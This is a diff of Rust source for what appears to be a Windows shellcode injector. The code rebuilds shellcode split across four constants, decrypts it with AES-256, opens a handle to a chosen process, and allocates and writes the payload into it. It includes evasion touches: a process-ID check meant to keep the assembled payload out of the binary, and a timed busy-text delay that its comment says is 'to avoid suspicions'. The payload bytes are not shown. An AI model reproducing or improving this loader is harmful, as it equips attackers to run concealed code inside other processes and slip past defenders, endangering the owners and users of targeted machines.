@@ -21,7 +21,6 @@ struct EncryptedShellcode<'a> {
     key: [u8; 32],
     iv: [u8; 16],
 }
-
 impl EncryptedShellcode<'_> { 
     fn decrypt(&self) -> Vec<u8> {
         let cipher = Cipher::new_256(&self.key);
@@ -46,7 +45,7 @@ fn fetch_handle(process: &mut WindowsProcess) {
             return;
         },
         Err(e) =>  match e.0 as u32 { 
-            0xC0000022  => eprintln!("[!] Privilege error acquiring handle!"), // STATUS_ACCESS_DENIED
+            0xC0000022  => eprintln!("[!] Privilege error while acquiring handle."), // STATUS_ACCESS_DENIED
             0xc000000b  => exit!(1, "[!] Invalid PID!"),
             _           => eprintln!("[!] Failure acquiring handle!\n -> NTSTATUS {:#x}", e.0),
         }
@@ -101,26 +100,9 @@ fn allocate_and_write(process: &mut WindowsProcess, payload: &[u8]) -> Result<CC
 // Debug run: $notepadProcess = Start-Process -FilePath "notepad.exe" -PassThru ; cargo run -- $notepadProcess.Id
 
 fn main() {
-    println!("[-] Beginning to re-construct shellcode.");
-    let mut reconstructed_shellcode: Vec<u8> = Vec::new();
-    if get_current_process_id() != 9 {
-        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_ONE));
-        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_TWO));
-        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_THREE));
-        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_FOUR));
-        println!("[+] Reconstruction succesful.")
-    }
-
-    let encrypted_payload = EncryptedShellcode{
-        shellcode: &reconstructed_shellcode, 
-        key: KEY, 
-        iv: INITVEC
-    };
-    let payload = encrypted_payload.decrypt();
-    
-
+    let squiggly = "|/-\\";
+    let second = std::time::Duration::from_millis(1000);
     let args: Vec<String> = std::env::args().collect();
-    // Ensure at least one argument (the program name) is provided
     if args.len() < 2 {
         println!("Usage: {} <pid>", args[0]);
         return;
@@ -130,23 +112,41 @@ fn main() {
     let target_pid: usize = match args[1].parse() {
         Ok(num) => num,
         Err(_) => {
-            println!("Error: Invalid input! Defaulting to self!");
+            println!("[!] Invalid input! Defaulting to self!");
             get_current_process_id()
         }
     };
+
+    println!("[-] Beginning to re-construct code.");
+    // This could and most likely should be implemented as a macro.
+    let mut reconstructed_shellcode: Vec<u8> = Vec::new();
+    // Random check to avoid baking the end-result in the binary.
+    if get_current_process_id() != 9 {
+        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_ONE));
+        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_TWO));
+        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_THREE));
+        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_FOUR));
+        println!("[+] Reconstruction is done.")
+    }
+
+    let encrypted_payload = EncryptedShellcode{
+        shellcode: &reconstructed_shellcode, 
+        key: KEY, 
+        iv: INITVEC
+    };
+    
     
     let mut target_process = WindowsProcess::from_pid(target_pid);
-
+    
     fetch_handle(&mut target_process);
+    let payload = encrypted_payload.decrypt();
     
     let address_start = match allocate_and_write(&mut target_process, &payload) {
         Ok(address)     => address,
         Err(_)                         => std::process::exit(-1),
     };
 
-    // Now, we should sleep for ~10 seconds while printing some busytext to remain normal looking.
-    let squiggly = "|/-\\";
-    let second = std::time::Duration::from_millis(1000);
+    // Now, we should sleep for ~10 seconds while printing some busytext to avoid suspicions.
     for i in 0..10 {
         let index = i % squiggly.len(); 
         print!("[{}] Eeping :>\r", squiggly.chars().nth(index).unwrap_or('\0')); 
